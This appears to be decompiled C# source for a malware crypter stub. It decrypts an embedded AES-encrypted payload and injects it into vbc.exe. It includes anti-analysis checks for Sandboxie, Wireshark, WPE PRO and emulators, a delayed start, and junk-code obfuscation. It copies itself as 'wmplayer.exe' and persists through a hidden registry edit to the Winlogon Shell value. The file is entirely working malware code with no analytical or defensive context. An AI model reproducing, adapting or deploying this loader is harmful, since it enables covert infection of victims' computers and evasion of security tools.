using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stub;

public class MyForm : Form
{
	[StructLayout(LayoutKind.Sequential, Size = 40)]
	private struct PROCESS_MEMORY_COUNTERS
	{
		public uint cb;

		public uint PageFaultCount;

		public uint PeakWorkingSetSize;

		public uint WorkingSetSize;

		public uint QuotaPeakPagedPoolUsage;

		public uint QuotaPagedPoolUsage;

		public uint QuotaPeakNonPagedPoolUsage;

		public uint QuotaNonPagedPoolUsage;

		public uint PagefileUsage;

		public uint PeakPagefileUsage;
	}

	private string Locate = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	private string StartupFileName = "wmplayer.exe";

	private bool AntiSB = true;

	private bool AntiWS = true;

	private bool AntiWPE = true;

	private bool AntiEmu;

	private bool Sleep = true;

	private bool Startup = true;

	private string MutexName = "xlHwrnd";

	[DllImport("psapi.dll", SetLastError = true)]
	private static extern bool GetProcessMemoryInfo(IntPtr hProcess, out PROCESS_MEMORY_COUNTERS counters, uint size);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).set_Visible(false);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	public unsafe MyForm()
	{
		InitializeComponent();
		BestClass bestClass = new BestClass();
		byte[] input = ReadFromResources();
		byte[] exeBuffer = AESDecrypt(input, "xlHwrndjbQghkloeGBTlOVHoN");
		PROCESS_MEMORY_COUNTERS counters = default(PROCESS_MEMORY_COUNTERS);
		counters.cb = (uint)sizeof(PROCESS_MEMORY_COUNTERS);
		GetProcessMemoryInfo(GetCurrentProcess(), out counters, counters.cb);
		TrashCode();
		if (AntiSB)
		{
			DetectSB();
		}
		TrashCode();
		if (AntiWS)
		{
			DetectWS();
		}
		TrashCode();
		if (AntiWPE)
		{
			DetectWPE();
		}
		TrashCode();
		if (AntiEmu)
		{
			DetectEmu();
		}
		try
		{
			Mutex.OpenExisting(MutexName);
			Environment.Exit(0);
			TrashCode();
		}
		catch
		{
			new Mutex(initiallyOwned: true, MutexName);
			TrashCode();
		}
		if (Sleep)
		{
			Thread.Sleep(30000);
		}
		if (Startup && Application.get_StartupPath() != Locate)
		{
			TrashCode();
			if (File.Exists(Locate + "\\" + StartupFileName))
			{
				TrashCode();
				File.Delete(Locate + "\\" + StartupFileName);
			}
			TrashCode();
			File.Copy(Application.get_ExecutablePath(), Locate + "\\" + StartupFileName);
			TrashCode();
			Process.Start(Locate + "\\" + StartupFileName);
			Environment.Exit(0);
		}
		if (Startup)
		{
			TrashCode();
			string text = "Shell";
			TrashCode();
			string text2 = "explorer.exe, " + Application.get_ExecutablePath();
			TrashCode();
			string text3 = "reg add \"hkcu\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v " + text + " /t reg_sz /d \"" + text2 + "\"";
			TrashCode();
			ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + text3);
			TrashCode();
			Process process = new Process();
			TrashCode();
			process.StartInfo = startInfo;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			TrashCode();
			process.Start();
			TrashCode();
		}
		TrashCode();
		if (counters.WorkingSetSize <= 100000000)
		{
			bestClass.Run(exeBuffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe"));
		}
	}

	private void DetectSB()
	{
		TrashCode();
		if (GetModuleHandle("Convert.ToString((char)83 + (char)98 + (char)105 + (char)101 + (char)68 + (char)108 + (char)108 + (char)46 + (char)68 + (char)108 + (char)108)").ToInt32() != 0)
		{
			Environment.Exit(1);
		}
	}

	private void DetectWS()
	{
		TrashCode();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			TrashCode();
			if (process.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
			{
				Environment.Exit(1);
			}
		}
	}

	private void DetectWPE()
	{
		TrashCode();
		Process[] processes = Process.GetProcesses();
		TrashCode();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Equals("WPE PRO"))
			{
				Environment.Exit(1);
			}
		}
	}

	private void DetectEmu()
	{
		long num = Environment.TickCount;
		Thread.Sleep(500);
		long num2 = Environment.TickCount;
		if (num2 - num < 500L)
		{
			Environment.Exit(1);
		}
	}

	public static byte[] AESDecrypt(byte[] input, string Pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	private byte[] ReadFromResources()
	{
		TrashCode();
		ResourceManager resourceManager = new ResourceManager("Stub.Properties.Resources", Assembly.GetExecutingAssembly());
		TrashCode();
		byte[] result = (byte[])resourceManager.GetObject("encFile");
		TrashCode();
		return result;
	}

	private void TrashCode()
	{
		char[] array = new char[573];
		for (int i = 0; i <= array.Length - 1; i++)
		{
			Random random = new Random();
			array[i] = Convert.ToChar(random.Next(1, 90));
		}
		HowTimeStamp();
	}

	public string Reverse(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public string HowTimeStamp()
	{
		string text = null;
		return DateTime.UtcNow.ToString();
	}
}
